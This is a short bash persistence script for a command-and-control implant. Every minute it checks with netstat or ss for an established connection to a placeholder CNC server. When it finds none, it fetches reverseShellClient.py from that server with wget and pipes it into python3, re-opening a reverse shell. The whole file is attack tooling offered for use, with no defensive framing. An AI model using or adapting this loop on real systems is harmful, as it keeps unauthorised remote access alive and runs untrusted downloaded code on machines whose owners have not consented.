#!/usr/bin/env bash

while :
do
    # CHeck if we have netstat/ss installed - see if we have a tcp connection to our CNC server
    if netstat --version &> /dev/null
    then
        tcp_con=$(netstat -tupn | grep ESTABLISHED | egrep '<cnc_server>:<port>' | awk '{ print $1 }' | xargs)
    else
        tcp_con=$(ss -tupn | grep ESTAB | egrep '<cnc_server>:<port>' | awk '{ print $1 }' | xargs)
    fi

    # If we don't have a connection - start another
    [[ ! "${tcp_con}" =~ tcp ]] && wget -O - <cnc_server>:8080/reverseShellClient.py | python3
    sleep 60 # run every minute

done
